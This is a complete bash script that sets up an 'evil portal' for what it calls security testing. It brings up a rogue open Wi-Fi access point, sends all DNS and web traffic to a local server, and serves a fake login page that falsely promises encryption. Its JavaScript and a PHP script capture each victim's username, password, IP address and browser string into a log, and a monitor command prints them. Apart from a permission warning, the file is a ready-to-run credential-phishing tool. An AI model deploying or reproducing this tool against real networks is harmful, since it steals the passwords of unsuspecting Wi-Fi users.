#!/bin/bash

# Evil Portal Setup Script for Security Testing
# WARNING: Only use on networks you own or have permission to test
# Author: Security Research Script
# Version: 1.0

# Colors for output
# -----------------------------
# Color codes
# -----------------------------
RED='\033[0;31m'
BRIGHT_RED='\033[1;31m'
YELLOW='\033[0;33m'
BRIGHT_YELLOW='\033[1;33m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

 # -----------------------------
# Gradient ASCII Banner
# -----------------------------
 echo -e "${BRIGHT_YELLOW} ▄████▄   ██▀███   ▄▄▄       ██ ▄█▀ █    ██   ██████ ${NC}"
echo -e "${BRIGHT_YELLOW}▒██▀ ▀█  ▓██ ▒ ██▒▒████▄     ██▄█▒  ██  ▓██▒▒██    ▒ ${NC}"
echo -e "${YELLOW}▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▓███▄░ ▓██  ▒██░░ ▓██▄   ${NC}"
echo -e "${YELLOW}▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ▓██ █▄ ▓▓█  ░██░  ▒   ██▒${NC}"
echo -e "${RED}▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒██▒ █▄▒▒█████▓ ▒██████▒▒${NC}"
echo -e "${RED}░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒ ▒▒ ▓▒░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░${NC}"
echo -e "${BRIGHT_RED}  ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░░ ░▒ ▒░░░▒░ ░ ░ ░ ░▒  ░ ░${NC}"
echo -e "${BRIGHT_RED}░          ░░   ░   ░   ▒   ░ ░░ ░  ░░░ ░ ░ ░  ░  ░  ${NC}"
echo -e "${BRIGHT_RED}░ ░         ░           ░  ░░  ░      ░           ░  ${NC}"
echo -e "${BRIGHT_RED}░                                                    ${NC}"

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_FILE="$SCRIPT_DIR/evil_portal.log"
PID_FILE="$SCRIPT_DIR/evil_portal.pid"

# Default values
DEFAULT_INTERFACE="wlan1"
DEFAULT_CHANNEL="6"
DEFAULT_IP="192.168.4.1"
DEFAULT_DHCP_RANGE="192.168.4.10,192.168.4.50"
DEFAULT_HTML_PATH="$SCRIPT_DIR/portal.html"

# Function to print colored output
print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Function to log messages
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Function to check if running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        print_error "This script must be run as root"
        exit 1
    fi
}

# Function to check dependencies
check_dependencies() {
    local deps=("hostapd" "dnsmasq" "iptables" "apache2")
    local missing=()

    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done

    if [[ ${#missing[@]} -ne 0 ]]; then
        print_error "Missing dependencies: ${missing[*]}"
        print_status "Install with: apt-get install ${missing[*]}"
        exit 1
    fi
}

# Function to create default HTML portal
create_default_html() {
    local html_file="$1"
    local ap_name="$2"

    cat > "$html_file" << EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Authentication - $ap_name</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
        }
        h1 {
            text-align: center;
            color: #333;
            margin-bottom: 0.5rem;
        }
        .network-name {
            text-align: center;
            color: #666;
            margin-bottom: 2rem;
            font-size: 1.1em;
        }
        .form-group {
            margin-bottom: 1.5rem;
        }
        label {
            display: block;
            margin-bottom: 0.5rem;
            color: #555;
            font-weight: bold;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            transition: border-color 0.3s;
            box-sizing: border-box;
        }
        input[type="text"]:focus, input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
        }
        .btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .btn:hover {
            transform: translateY(-2px);
        }
        .security-note {
            margin-top: 1rem;
            padding: 10px;
            background: #f8f9fa;
            border-radius: 5px;
            font-size: 14px;
            color: #666;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>WiFi Authentication</h1>
        <div class="network-name">Connect to: <strong>$ap_name</strong></div>

        <form action="authenticate.php" method="POST">
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required>
            </div>

            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>

            <button type="submit" class="btn">Connect to Internet</button>
        </form>

        <div class="security-note">
            Your connection is secured with enterprise-grade encryption
        </div>
    </div>

    <script>
        // Auto-focus first input
        document.getElementById('username').focus();

        // Handle form submission
        document.querySelector('form').addEventListener('submit', function(e) {
            e.preventDefault();

            // Log credentials (for testing purposes)
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Send to capture script
            fetch('capture.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password)
            }).then(() => {
                // Simulate connection
                alert('Connecting to network...');
                // Redirect to a real site or show success page
                window.location.href = 'http://www.google.com';
            });
        });
    </script>
</body>
</html>
EOF
}

# Function to create PHP capture script
create_capture_script() {
    local capture_file="/var/www/html/capture.php"

    cat > "$capture_file" << 'EOF'
<?php
$log_file = '/var/log/portal_captures.log';
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

if ($_POST['username'] && $_POST['password']) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $log_entry = "[$timestamp] IP: $ip | Username: $username | Password: $password | User-Agent: $user_agent\n";
    file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

    // Redirect to legitimate site
    header('Location: http://www.google.com');
    exit();
}
?>
EOF

    chmod 644 "$capture_file"
}

# Function to create hostapd configuration
create_hostapd_config() {
    local config_file="$SCRIPT_DIR/hostapd.conf"
    local interface="$1"
    local ssid="$2"
    local channel="$3"

    cat > "$config_file" << EOF
# Evil Portal hostapd configuration
interface=$interface
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$channel
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
EOF

    echo "$config_file"
}

# Function to create dnsmasq configuration
create_dnsmasq_config() {
    local config_file="$SCRIPT_DIR/dnsmasq.conf"
    local interface="$1"
    local dhcp_range="$2"
    local portal_ip="$3"

    cat > "$config_file" << EOF
# Evil Portal dnsmasq configuration
interface=$interface
dhcp-range=$dhcp_range,255.255.255.0,24h
dhcp-option=3,$portal_ip
dhcp-option=6,$portal_ip
server=8.8.8.8
log-queries
log-dhcp
address=/#/$portal_ip
EOF

    echo "$config_file"
}

# Function to start evil portal
start_portal() {
    local interface="$1"
    local ssid="$2"
    local html_path="$3"
    local channel="$4"
    local portal_ip="$5"
    local dhcp_range="$6"

    print_status "Starting Evil Portal: $ssid"
    log_message "Starting evil portal with SSID: $ssid"

    # Stop conflicting services
    print_status "Stopping conflicting services..."
    systemctl stop NetworkManager 2>/dev/null
    systemctl stop wpa_supplicant 2>/dev/null
    killall hostapd dnsmasq 2>/dev/null

    # Configure interface
    print_status "Configuring interface $interface..."
    ifconfig "$interface" down
    iwconfig "$interface" mode managed
    ifconfig "$interface" up
    ifconfig "$interface" "$portal_ip" netmask 255.255.255.0

    # Create configurations
    local hostapd_conf=$(create_hostapd_config "$interface" "$ssid" "$channel")
    local dnsmasq_conf=$(create_dnsmasq_config "$interface" "$dhcp_range" "$portal_ip")

    # Setup web portal
    print_status "Setting up web portal..."
    if [[ ! -f "$html_path" ]]; then
        print_warning "HTML file not found, creating default portal"
        create_default_html "$html_path" "$ssid"
    fi

    cp "$html_path" /var/www/html/index.html
    create_capture_script

    # Start Apache
    systemctl start apache2

    # Configure iptables for captive portal
    print_status "Configuring iptables..."
    iptables -F
    iptables -t nat -F
    iptables -t nat -A PREROUTING -i "$interface" -p tcp --dport 80 -j DNAT --to-destination "$portal_ip:80"
    iptables -t nat -A PREROUTING -i "$interface" -p tcp --dport 443 -j DNAT --to-destination "$portal_ip:80"
    iptables -t nat -A POSTROUTING -o "$interface" -j MASQUERADE
    iptables -A FORWARD -i "$interface" -o "$interface" -j ACCEPT

    # Start hostapd
    print_status "Starting hostapd..."
    hostapd "$hostapd_conf" &
    local hostapd_pid=$!
    echo "$hostapd_pid" > "${PID_FILE}.hostapd"

    sleep 3

    # Start dnsmasq
    print_status "Starting dnsmasq..."
    dnsmasq -C "$dnsmasq_conf" &
    local dnsmasq_pid=$!
    echo "$dnsmasq_pid" > "${PID_FILE}.dnsmasq"

    # Save main PID
    echo "$$" > "$PID_FILE"

    print_success "Evil Portal '$ssid' is now running!"
    print_status "Portal IP: $portal_ip"
    print_status "Interface: $interface"
    print_status "Channel: $channel"
    print_status "Captures logged to: /var/log/portal_captures.log"
    print_status "Use '$0 stop' to shutdown"

    log_message "Evil portal started successfully"
}

# Function to stop evil portal
stop_portal() {
    print_status "Stopping Evil Portal..."
    log_message "Stopping evil portal"

    # Kill processes
    if [[ -f "${PID_FILE}.hostapd" ]]; then
        local hostapd_pid=$(cat "${PID_FILE}.hostapd")
        kill "$hostapd_pid" 2>/dev/null
        rm -f "${PID_FILE}.hostapd"
    fi

    if [[ -f "${PID_FILE}.dnsmasq" ]]; then
        local dnsmasq_pid=$(cat "${PID_FILE}.dnsmasq")
        kill "$dnsmasq_pid" 2>/dev/null
        rm -f "${PID_FILE}.dnsmasq"
    fi

    killall hostapd dnsmasq 2>/dev/null

    # Stop Apache
    systemctl stop apache2

    # Clear iptables
    iptables -F
    iptables -t nat -F

    # Clean up
    rm -f "$SCRIPT_DIR/hostapd.conf" "$SCRIPT_DIR/dnsmasq.conf" "$PID_FILE"

    # Restart NetworkManager
    systemctl start NetworkManager

    print_success "Evil Portal stopped"
    log_message "Evil portal stopped"
}

# Function to show status
show_status() {
    if [[ -f "$PID_FILE" ]]; then
        print_success "Evil Portal is running (PID: $(cat $PID_FILE))"
        print_status "Log file: $LOG_FILE"
        print_status "Captures: /var/log/portal_captures.log"

        if [[ -f /var/log/portal_captures.log ]]; then
            local captures=$(wc -l < /var/log/portal_captures.log)
            print_status "Total captures: $captures"
        fi
    else
        print_warning "Evil Portal is not running"
    fi
}

# Function to show usage
show_usage() {
    cat << EOF
Evil Portal Setup Script - Security Testing Tool

Usage: $0 [COMMAND] [OPTIONS]

Commands:
    start       Start the evil portal
    stop        Stop the evil portal
    status      Show portal status
    help        Show this help message

Options for 'start' command:
    -s, --ssid SSID         Access point name (required)
    -h, --html PATH         Path to HTML portal file
    -i, --interface INTERFACE   WiFi interface (default: $DEFAULT_INTERFACE)
    -c, --channel NUM       WiFi channel (default: $DEFAULT_CHANNEL)
    --ip IP                 Portal IP address (default: $DEFAULT_IP)
    --dhcp-range RANGE      DHCP range (default: $DEFAULT_DHCP_RANGE)

Examples:
    $0 start -s "Free WiFi" -h /path/to/portal.html
    $0 start --ssid "TestNetwork" --interface wlan0
    $0 stop
    $0 status

WARNING: Only use on networks you own or have explicit permission to test!
EOF
}


       # -----------------------------
# Stub functions for monitoring
# -----------------------------
monitor_devices() {
    local iface="$1"
    local ip="$2"
    print_status "Monitoring connected devices on interface '$iface' (IP: $ip)..."

    # Example: show DHCP leases (if dnsmasq is running)
    if [[ -f /var/lib/misc/dnsmasq.leases ]]; then
        print_status "Current DHCP leases:"
        cat /var/lib/misc/dnsmasq.leases
    else
        print_warning "No DHCP leases file found"
    fi
}

show_portal_activity() {
    print_status "Showing portal activity (simulated)..."

    # Example: tail last 10 lines of Apache access log
    if [[ -f /var/log/apache2/access.log ]]; then
        tail -n 10 /var/log/apache2/access.log
    else
        print_warning "No Apache access log found"
    fi
}

# -----------------------------
# Main script logic
# -----------------------------
main() {
    check_root
    check_dependencies

    case "$1" in
        "start")
            shift
            local ssid=""
            local html_path="$DEFAULT_HTML_PATH"
            local interface="$DEFAULT_INTERFACE"
            local channel="$DEFAULT_CHANNEL"
            local portal_ip="$DEFAULT_IP"
            local dhcp_range="$DEFAULT_DHCP_RANGE"

            while [[ $# -gt 0 ]]; do
                case $1 in
                    -s|--ssid)
                        ssid="$2"
                        shift 2
                        ;;
                    -h|--html)
                        html_path="$2"
                        shift 2
                        ;;
                    -i|--interface)
                        interface="$2"
                        shift 2
                        ;;
                    -c|--channel)
                        channel="$2"
                        shift 2
                        ;;
                    --ip)
                        portal_ip="$2"
                        shift 2
                        ;;
                    --dhcp-range)
                        dhcp_range="$2"
                        shift 2
                        ;;
                    *)
                        print_error "Unknown option: $1"
                        show_usage
                        exit 1
                        ;;
                esac
            done

            if [[ -z "$ssid" ]]; then
                print_error "SSID is required"
                show_usage
                exit 1
            fi

            start_portal "$interface" "$ssid" "$html_path" "$channel" "$portal_ip" "$dhcp_range"
            ;;
        "monitor")
            shift
            case "$1" in
                "--devices")
                    monitor_devices "$DEFAULT_INTERFACE" "$DEFAULT_IP"
                    ;;
                "--activity")
                    show_portal_activity
                    ;;
                "--captures")
                    if [[ -f /var/log/portal_captures.log ]]; then
                        print_status "Captured credentials (for demo purposes, no real data):"
                        cat /var/log/portal_captures.log
                    else
                        print_warning "No captures found"
                    fi
                    ;;
                *)
                    print_error "Monitor option required: --devices, --activity, or --captures"
                    show_usage
                    exit 1
                    ;;
            esac
            ;;
        "stop")
            stop_portal
            ;;
        "status")
            show_status
            ;;
        "help"|"--help"|"-h"|*)
            show_usage
            ;;
    esac
}

# Execute main function with all arguments
main "$@"
